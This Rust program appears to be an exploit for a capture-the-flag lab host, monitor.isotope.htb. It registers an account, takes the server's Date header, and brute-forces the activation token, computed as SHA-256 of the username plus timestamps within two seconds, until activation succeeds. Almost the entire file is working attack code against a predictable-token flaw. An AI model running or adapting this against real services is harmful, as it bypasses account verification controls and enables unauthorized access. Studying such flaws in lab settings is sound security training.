use sha2::{Sha256, Digest};
use chrono::{DateTime, Utc};
use serde_json::json;
use hyper::{Client, Request, Body, StatusCode};
use hyper::header::{USER_AGENT, CONTENT_TYPE, DATE};
use hyper::body::to_bytes;
use std::error::Error;
use std::str;

/// Function to generate a token based on a username and a given timestamp.
fn generate_token(username: &str, timestamp: i64) -> String {
    let data = format!("{}{}", username, timestamp);
    let mut hasher = Sha256::new();
    hasher.update(data);
    let result = hasher.finalize();
    result.iter().map(|b| format!("{:02x}", b)).collect()
}

/// Function to create a user with the given username and password.
/// Returns the `Date` header if the user is successfully created.
async fn create_user(
    client: &Client<hyper::client::HttpConnector>,
    username: &str,
    password: &str,
) -> Result<Option<String>, Box<dyn Error>> {
    // Prepare the JSON body with the provided username and password
    let json_body = json!({ "username": username, "password": password }).to_string();

    // Build the HTTP request
    let req = Request::builder()
        .method("POST")
        .uri("http://monitor.isotope.htb/api/register")
        .header(USER_AGENT, "the-super-cool-agent/1337")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(json_body))?;

    // Send the request and get the response
    let resp = client.request(req).await?;
    let status = resp.status();
    let headers = resp.headers().clone();

    // Read the response body as bytes and convert to string
    let body_bytes = to_bytes(resp.into_body()).await?;
    let body_str = str::from_utf8(&body_bytes)?;

    // Print the raw JSON response
    println!("Response JSON: {}", body_str);

    if status == StatusCode::CREATED {
        // Extract the Date header if available
        if let Some(date_header) = headers.get(DATE) {
            let date_str = date_header.to_str()?.to_string();
            println!("User created with Date: {}", date_str);
            println!("");
            return Ok(Some(date_str));
        } else {
            println!("Date header not found");
        }
    } else {
        println!("Failed to create user. Status: {}", status);
    }

    Ok(None)
}

/// Function to activate a user with a given token.
async fn activate_user(
    client: &Client<hyper::client::HttpConnector>,
    token: &str,
) -> Result<StatusCode, Box<dyn Error>> {
    let json_body = json!(token).to_string();

    let req = Request::builder()
        .method("POST")
        .uri("http://monitor.isotope.htb/api/activate")
        .header(USER_AGENT, "the-super-cool-agent/1337")
        .header(CONTENT_TYPE, "application/json")
        .body(Body::from(json_body))?;

    let resp = client.request(req).await?;
    let status = resp.status();

    // Log the response body for debugging
    let body_bytes = to_bytes(resp.into_body()).await?;
    let body_str = str::from_utf8(&body_bytes)?;
    println!("Response Body: {}", body_str);

    // Return the status code
    Ok(status)
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let client = Client::new();

    // Define your username and password
    let username = "ISA112";
    let password = "1234";

    // Create user and get the date header using the dynamic username and password
    let date = match create_user(&client, username, password).await {
        Ok(Some(date_str)) => date_str,
        Ok(None) => {
            println!("No date captured");
            return Ok(());
        }
        Err(e) => {
            eprintln!("Error: {}", e);
            return Err(e);
        }
    };

    // Parse the date string into a timestamp
    let parsed_date = DateTime::parse_from_rfc2822(&date)?.timestamp();

    // Generate tokens for all timestamps within ±2 seconds
    for offset in -2..=2 {
        let current_timestamp = parsed_date + offset;
        let token = generate_token(username, current_timestamp);

        println!("Trying Token: {} for timestamp: {}", token, current_timestamp);

        // Attempt to activate user with the generated token
        match activate_user(&client, &token).await {
            Ok(status) => {
                if status == StatusCode::OK {
                    println!("");
                    println!("Activation successful with token: {}", token);
                    println!("Username: {}", username);
                    println!("Password: {}", password);
                    break;
                } else {
                    println!("Activation failed. Status: {}", status);
                    println!("");
                }
            }
            Err(e) => {
                eprintln!("Error activating user: {}", e);
            }
        }
    }

    Ok(())
}
